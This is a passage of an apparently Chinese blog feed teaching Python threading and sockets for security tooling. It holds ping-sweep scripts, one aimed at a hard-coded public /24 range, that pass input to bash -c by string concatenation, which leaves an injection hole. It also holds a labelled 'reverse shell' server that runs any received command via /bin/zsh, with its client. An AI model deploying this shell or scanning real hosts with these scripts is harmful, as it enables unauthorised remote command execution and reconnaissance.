    <content type="html"><![CDATA[<h2 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h2><h6 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h6><p>是程序的一次执行。<br>每个进程都有自己的地址空间、内存、数据栈以及其他记录运行轨迹的辅助数据</p><h6 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h6><p>所有的线程运行在同一个进程当中，共享相同的运行环境。<br>线程有：开始、顺序执行、结束 三个部分。<br>多个线程协同完成一个进程的任务。</p><blockquote><p>我们在编写安全工具的时候，使用多线程要更多些(使用多进程相对较少)</p></blockquote><h3 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h3><blockquote><p>缺点：程序复杂时，不能计算线程数量和控制，稳定性不太好</p></blockquote><p>使用<code>_thread.start_new_thread(ping_check, (ip,))</code> ，第一个参数是回调函数，第二个的可变参数(tuple类型的)</p><p>Note： 必须配合<code>time.sleep()</code></p><p>实例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">使用ping检查C段机器(一个C段是0-255)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_check</span><span class="params">(ip_addr)</span>:</span></span><br><span class="line">    <span class="comment"># 一个执行系统命令的模块</span></span><br><span class="line">    check = Popen([<span class="string">'/bin/bash'</span>, <span class="string">'-c'</span>, <span class="string">'ping -c 2 '</span>+ip_addr], stdin=PIPE,stdout=PIPE)</span><br><span class="line">    data = check.stdout.read()   <span class="comment"># 返回的数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'ttl'</span> <span class="keyword">in</span> str(data):</span><br><span class="line">        print(<span class="string">"&#123;&#125; is up"</span>.format(ip_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(ip_three)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">        ip = ip_three + <span class="string">'.'</span> + str(i)</span><br><span class="line">        _thread.start_new_thread(ping_check, (ip,))</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ip_three = input(<span class="string">"输入ip地址的前三个字节(不需要最后一个点): \n"</span>)</span><br><span class="line">    <span class="comment"># 判断最后是否有点</span></span><br><span class="line">    pattern = <span class="string">r'\.$'</span></span><br><span class="line">    has_point = re.findall(pattern, ip_three)</span><br><span class="line">    <span class="keyword">if</span> has_point:</span><br><span class="line">        ip_three = ip_three[:<span class="number">-1</span>]</span><br><span class="line">        print(ip_three)</span><br><span class="line">    main(ip_three)</span><br></pre></td></tr></table></figure><h2 id="threading-重点"><a href="#threading-重点" class="headerlink" title="threading (重点)"></a>threading <strong>(重点)</strong></h2><h6 id="1-Thead类"><a href="#1-Thead类" class="headerlink" title="1.Thead类"></a>1.Thead类</h6><ul><li>使用threading模块</li><li>子类化Thread类</li></ul><blockquote><p>解决了线程数量可控的问题</p></blockquote><p>简单例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(key)</span>:</span></span><br><span class="line">    print(<span class="string">"Hello %s:%s"</span>%(key, time.ctime()))</span><br><span class="line">    print(threading.current_thread())  <span class="comment"># 当前线程</span></span><br><span class="line">    print(<span class="string">"*"</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    threads = []</span><br><span class="line">    keys = [<span class="string">'张三'</span>, <span class="string">'李四'</span>, <span class="string">'王五'</span>, <span class="string">'陆大人'</span>]</span><br><span class="line">    threads_count = len(keys)</span><br><span class="line">    <span class="comment"># 生成参数长度个线程数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        t = threading.Thread(target=func1, args=(keys[i],))</span><br><span class="line">        threads.append(t)   <span class="comment"># 线程加入线程列表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        threads[i].start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待线程结束 join()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        threads[i].join()    <span class="comment"># 保证【所有】的线程都会结束 再运行主线程   遇到join会阻塞</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>实例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">对百度以10个线程访问10次</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">()</span>:</span></span><br><span class="line">    time_start = time.time()</span><br><span class="line">    r = requests.get(url=<span class="string">'http://www.baidu.com'</span>)</span><br><span class="line">    times = time.time() - time_start     <span class="comment"># 耗时</span></span><br><span class="line">    sys.stdout.write(<span class="string">"Status:%s---%s---%s"</span>%(r.status_code, times, time.strftime(<span class="string">"%H:%M:%S"</span>)))  <span class="comment"># 当前时间</span></span><br><span class="line">    print(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    threads = []</span><br><span class="line">    threads_count = <span class="number">10</span>    <span class="comment"># 定义 线程数</span></span><br><span class="line">    <span class="comment"># 生成参数长度个线程数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        t = threading.Thread(target=func1)</span><br><span class="line">        threads.append(t)   <span class="comment"># 线程加入线程列表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        threads[i].start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待线程结束 join()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        threads[i].join()     <span class="comment"># 保证【所有】的线程都会结束 再运行主线程   遇到join会阻塞</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h6 id="2-生产者-消费者问题-和-Queue模块-重中之重"><a href="#2-生产者-消费者问题-和-Queue模块-重中之重" class="headerlink" title="2.生产者-消费者问题 和 Queue模块 (重中之重)\"></a>2.生产者-消费者问题 和 Queue模块 <strong><em>(重中之重)\</em></strong></h6><ul><li>Queue模块[ qsize(), empty(), full(), put(), get() ]</li><li>完美搭档：Queue + Thread</li></ul><blockquote><p>解决了生产参数和计算结果时间都不确定的问题</p></blockquote><blockquote><p>最常使用</p></blockquote><p><strong>Queue：</strong></p><p>将产生的货物放到Queue中，消费者从Queue中拿数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line">q = queue.Queue(<span class="number">100</span>)  <span class="comment"># 可以直接指定队列的大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    q.put(i)  <span class="comment"># 也可以这样放入</span></span><br><span class="line"></span><br><span class="line">q.empty()    <span class="comment"># 查看是否为空</span></span><br><span class="line"></span><br><span class="line">q.qsize()    <span class="comment"># 查看大小</span></span><br><span class="line"></span><br><span class="line">q.get()   <span class="comment"># 依次取出数据</span></span><br><span class="line"></span><br><span class="line">q.full()   <span class="comment"># 是否满了</span></span><br><span class="line"></span><br><span class="line">queue.task_done()  <span class="comment"># 告诉队列，这个任务执行完成了</span></span><br></pre></td></tr></table></figure><p>生产者消费者讲解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">所谓，生产者与消费者模型，其实是把一个需要进程通信的问题分开考虑</span></span><br><span class="line"><span class="string">生产者，只需要往队列里面丢东西（生产者不需要关心消费者）</span></span><br><span class="line"><span class="string">消费者，只需要从队列里面拿东西（消费者也不需要关心生产者</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">生产者：</span></span><br><span class="line"><span class="string">只关心队列是否已满。</span></span><br><span class="line"><span class="string">没满，则生产，满了就阻塞。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">消费者：</span></span><br><span class="line"><span class="string">只关心队列是否为空。</span></span><br><span class="line"><span class="string">不为空，则消费，为空则阻塞。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread   <span class="comment"># 线程</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Produce</span><span class="params">(Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, queue)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.queue = queue</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            item = random.randint(<span class="number">0</span>,<span class="number">99</span>)</span><br><span class="line">            <span class="keyword">if</span> self.queue.full():</span><br><span class="line">                print(<span class="string">"当前队列长度&#123;&#125;"</span>.format(self.queue.qsize()))</span><br><span class="line">            self.queue.put(item)   <span class="comment"># 只要队列没满， 向队列存入数据</span></span><br><span class="line">            print(<span class="string">"生产者%s ==&gt; 已经生产 %s, 并将其加入到了队列中"</span> %(threading.current_thread(),item))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, queue)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.queue = queue</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            item = self.queue.get()    <span class="comment"># 只要队列不为空， 就从队列中取出数据</span></span><br><span class="line">            print(<span class="string">"消费者 ==&gt; 从队列中取出 %s"</span> %item)</span><br><span class="line">            self.queue.task_done()  <span class="comment"># 告诉队列，这个任务执行完成了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    q = queue.Queue(<span class="number">10000</span>)</span><br><span class="line">    p = Produce(q)</span><br><span class="line">    p1 = Produce(q)</span><br><span class="line">    c = Consumer(q)</span><br><span class="line">    p.start()</span><br><span class="line">    p1.start()</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    c.start()</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">使用 threding 和 Quque 结合， ping_check</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue  <span class="comment"># 注意是小写</span></span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 继承多线程的类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoRun</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, queue)</span>:</span></span><br><span class="line">        <span class="comment"># threading.Thread.__init__(self)</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self._queue = queue</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重写了run方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 如果Queue不为空就继续执行</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            ip = self._queue.get()</span><br><span class="line">            check_ping = Popen([<span class="string">'/bin/bash'</span>,<span class="string">'-c'</span>,<span class="string">'ping -c 2 '</span>+ip], stdin=PIPE, stdout=PIPE)</span><br><span class="line">            data = check_ping.stdout.read()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'ttl'</span> <span class="keyword">in</span> str(data):</span><br><span class="line">                sys.stdout.write(ip + <span class="string">" is up"</span>)</span><br><span class="line">                print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    threads = []</span><br><span class="line">    threads_count = <span class="number">10</span></span><br><span class="line">    <span class="comment"># 创建一个空的队列</span></span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># put到队列</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        q.put(<span class="string">"123.206.96."</span>+str(i))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        threads.append(DoRun(q))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;讲解&quot;&gt;&lt;a href=&quot;#讲解&quot; class=&quot;headerlink&quot; title=&quot;讲解&quot;&gt;&lt;/a&gt;讲解&lt;/h2&gt;&lt;h6 id=&quot;进程&quot;&gt;&lt;a href=&quot;#进程&quot; class=&quot;headerlink&quot; title=&quot;进程&quot;&gt;&lt;/a&gt;进程&lt;/h6&gt;&lt;p&gt;是程序
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="多线程" scheme="http://www.xpshuai.cn/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python-socket编程</title>
    <link href="http://www.xpshuai.cn/python-socket%E7%BC%96%E7%A8%8B/"/>
    <id>http://www.xpshuai.cn/python-socket编程/</id>
    <published>2020-02-24T03:29:46.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h2><h4 id="C-S架构"><a href="#C-S架构" class="headerlink" title="C/S架构"></a>C/S架构</h4><p>客户机和服务器结构</p><p>Server唯一的目的就是等待client的请求，client连上server发送必要的数据，然后等待server端完成请求的范阔</p><h4 id="C-S网络编程"><a href="#C-S网络编程" class="headerlink" title="C/S网络编程"></a>C/S网络编程</h4><p>Server端进行设置，首先创建一个通信端点，让server端能够监听请求，之后就进入等待和处理Client请求的无限循环中</p><p>Client编程相对Server端编程简单，只要创建一个通信端点，建立到服务器的连接，就可以提出wing我就来</p><h4 id="套接字-socket"><a href="#套接字-socket" class="headerlink" title="套接字(socket)"></a>套接字(socket)</h4><p>是一种具有之前所说的“通信端点”概念的计算机网络数据结构。网络化的应用程序在开始任何通讯之前都必须创建套接字</p><blockquote><p>套接字 = (ip, 端口)</p></blockquote><p><strong>Python支持:</strong></p><p>- AF_UNIX              –&gt; Unix下进行通信的</p><p>- AF_NETLINK        –&gt; 是Linux下的套接字</p><p>- AF_INET               –&gt; 是基于网络的套接字 （我们下面的重点）</p><p>Python的<code>socket模块</code>创建TCP/IP套接字，方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参数（套接字家族，套接字类型）</span></span><br><span class="line"><span class="comment"># AF_INET：基于网络的， SOCK_SREAM：代表TCP/IP</span></span><br><span class="line"></span><br><span class="line">tcp_scoket = socket(socket.AF_INET, socket.SOCK_SREAM)</span><br></pre></td></tr></table></figure><p><strong>套接字对象的方法：</strong></p><p>服务端套接字函数：</p><p><img src="/python-socket编程/20200224115918247_1326600052.png"></p><p>公共用途套接字函数：</p><p><img src="/python-socket编程/20200224120055141_721974743.png"></p><blockquote><p>创建连接之后要关闭</p></blockquote><h6 id="实例"><a href="#实例" class="headerlink" title="实例:"></a>实例:</h6><p><img src="/python-socket编程/20200224120328176_1633754561.png"></p><p><strong>反弹Shell：</strong></p><p>在客户端获取服务端的shell</p><p>1.获取Linux的shell：</p><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">反弹shell</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE     <span class="comment"># 执行系统命令</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">''</span>   <span class="comment"># 如果是本机最为服务端，地址可以不用填写</span></span><br><span class="line">PORT = <span class="number">8888</span></span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line">tcp_server = socket.socket()   <span class="comment"># type默认是tcp</span></span><br><span class="line">tcp_server.bind(ADDR)</span><br><span class="line">tcp_server.listen(<span class="number">5</span>)</span><br><span class="line">print(<span class="string">"开始监听"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 服务端和客户端的循环连接</span></span><br><span class="line">    print(<span class="string">"Waiting fpr connecting..."</span>)</span><br><span class="line">    coon, addr = tcp_server.accept()  <span class="comment"># 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞</span></span><br><span class="line">    print(<span class="string">"... connected from:"</span> + str(addr))</span><br><span class="line">    <span class="comment"># 下面是通信的循环</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = coon.recv(BUFSIZE)          <span class="comment"># 读取客户端发送的消息 （指明一次性能接收的最大字节数量）</span></span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 执行获取服务端的系统命令（在客户端连接后可以执行服务端的命令）</span></span><br><span class="line">                cmd = Popen([<span class="string">'/bin/zsh'</span>, <span class="string">'-c'</span>, data], stdin=PIPE, stdout=PIPE)</span><br><span class="line">                cmd_data = cmd.stdout.read()</span><br><span class="line">                coon.send(cmd_data)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"客户端&#123;&#125;已断开"</span>.format(addr))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>2.获取Window的shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>client.py不变</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">''</span>   <span class="comment"># 如果是本机最为服务端，地址可以不用填写</span></span><br><span class="line">PORT = <span class="number">8888</span></span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line">tcp_cient = socket.socket()</span><br><span class="line">tcp_cient.connect(ADDR)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"客户端：\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据交互循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    msg = input(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    <span class="keyword">if</span> msg:</span><br><span class="line">        tcp_cient.send(msg.encode())   <span class="comment"># 只能发送 bytes 类型的数据</span></span><br><span class="line">        data = tcp_cient.recv(BUFSIZE)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        print(data.decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tcp_cient.close()</span></span><br><span class="line"><span class="comment"># c.close()    # 主动断开   # 服务端会recv到一个空字符串</span></span><br></pre></td></tr></table></figure><hr><h4 id="1-阻塞的套接字"><a href="#1-阻塞的套接字" class="headerlink" 